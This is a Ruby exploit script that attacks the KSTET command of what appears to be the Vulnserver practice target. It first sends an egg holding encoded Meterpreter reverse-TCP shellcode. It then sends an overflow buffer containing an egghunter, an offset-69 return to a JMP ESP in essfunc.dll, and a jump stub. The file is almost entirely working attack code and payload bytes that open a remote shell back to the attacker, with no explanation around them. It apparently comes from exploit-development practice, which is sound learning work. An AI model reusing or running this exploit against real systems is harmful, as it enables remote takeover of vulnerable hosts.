#!/usr/bin/env ruby
#egghunter - x66x81xcaxffx0fx42x52x6ax02x58xcdx2ex3cx05x5ax74xefxb8x52x30x63x58x8bxfaxafx75xeaxafx75xe7xffxe7
#egg = R0cX - 0x52306358
require 'socket'

# EggHunter proccess
egghuntme = "GDOG " # our variable containing the "egg" for our egghunter to find starts here
egghuntme += "R0cX" * 2 # two iterations of search string "R0cX"
#egghuntme += "\xcc" * 4 # four int3 breakpoints, the "egg" that will be executed 
# msfvenom -p windows/meterpreter/reverse_tcp LPORT=1234 -e x86/shikata_ga_nai -f ruby -b 'x00x0ax0d'
egghuntme += "\xbd\x34\x24\x91\x31\xd9\xc0\xd9\x74\x24\xf4\x58\x29\xc9" +
"\xb1\x56\x31\x68\x13\x83\xc0\x04\x03\x68\x3b\xc6\x64\xcd" +
"\xab\x84\x87\x2e\x2b\xe9\x0e\xcb\x1a\x29\x74\x9f\x0c\x99" +
"\xfe\xcd\xa0\x52\x52\xe6\x33\x16\x7b\x09\xf4\x9d\x5d\x24" +
"\x05\x8d\x9e\x27\x85\xcc\xf2\x87\xb4\x1e\x07\xc9\xf1\x43" +
"\xea\x9b\xaa\x08\x59\x0c\xdf\x45\x62\xa7\x93\x48\xe2\x54" +
"\x63\x6a\xc3\xca\xf8\x35\xc3\xed\x2d\x4e\x4a\xf6\x32\x6b" +
"\x04\x8d\x80\x07\x97\x47\xd9\xe8\x34\xa6\xd6\x1a\x44\xee" +
"\xd0\xc4\x33\x06\x23\x78\x44\xdd\x5e\xa6\xc1\xc6\xf8\x2d" +
"\x71\x23\xf9\xe2\xe4\xa0\xf5\x4f\x62\xee\x19\x51\xa7\x84" +
"\x25\xda\x46\x4b\xac\x98\x6c\x4f\xf5\x7b\x0c\xd6\x53\x2d" +
"\x31\x08\x3c\x92\x97\x42\xd0\xc7\xa5\x08\xbc\x24\x84\xb2" +
"\x3c\x23\x9f\xc1\x0e\xec\x0b\x4e\x22\x65\x92\x89\x33\x61" +
"\x25\x45\xfb\xe2\xdb\x66\xfb\x2b\x18\x32\xab\x43\x89\x3b" +
"\x20\x94\x36\xee\xdc\x9e\xa0\xd1\x88\x9f\x3d\xba\xca\x9f" +
"\x39\xe8\x43\x79\x11\x5c\x03\xd6\xd2\x0c\xe3\x86\xba\x46" +
"\xec\xf9\xdb\x68\x27\x92\x76\x87\x91\xca\xee\x3e\xb8\x81" +
"\x8f\xbf\x17\xec\x90\x34\x9d\x10\x5e\xbd\xd4\x02\xb7\xda" +
"\x16\xdb\x48\x4f\x16\xb1\x4c\xd9\x41\x2d\x4f\x3c\xa5\xf2" +
"\xb0\x6b\xb6\xf5\x4f\xea\x8e\x8e\x66\x78\xae\xf8\x86\x6c" +
"\x2e\xf9\xd0\xe6\x2e\x91\x84\x52\x7d\x84\xca\x4e\x12\x15" +
"\x5f\x71\x42\xc9\xc8\x19\x68\x34\x3e\x86\x93\x13\x3c\xc1" +
"\x6b\xe1\x6b\x6a\x03\x19\x2c\x8a\xd3\x73\xac\xda\xbb\x88" +
"\x83\xd5\x0b\x70\x0e\xbe\x03\xfb\xdf\x0c\xb2\xfc\xf5\xd1" +
"\x6a\xfc\xfa\xc9\x9d\x87\x73\xed\x5e\x78\x9a\x8a\x5f\x78" +
"\xa2\xac\x5c\xae\x9b\xda\xa3\x72\x98\xd5\x96\xd7\x89\x7f" +
"\xd8\x44\xc9\x55"

#EIP = 0x41336341 -> Offset = 69
badHeader = "KSTET ."
badData = "\x90" * 20
badData += "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x52\x30\x63\x58\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
# skape syscall egghunter searching for R0cX
badData += "\x90" * (69 - badData.size)
badData += "\xAF\x11\x50\x62" # Memory address 0x625011AF # JMP ESP essfunc.dll
jmpShellCode = "\x89\xe0" #mov eax, esp
jmpShellCode += "\x83\xe8\x40" #sub eax, 0x40
jmpShellCode += "\xff\xe0" #jmp eax

host = "192.168.0.78" # ARGV[0]
port = "9999"  # ARGV[1]

# Config Server

s = TCPSocket.open(host, port)
receive = s.recv(1024)
puts receive
puts "[+] Sending Egghunter"
s.send(egghuntme, 0)
s.recv(1024)
puts "[+] Sending Evil buffer"
s.send(badHeader + badData + jmpShellCode, 0)
s.close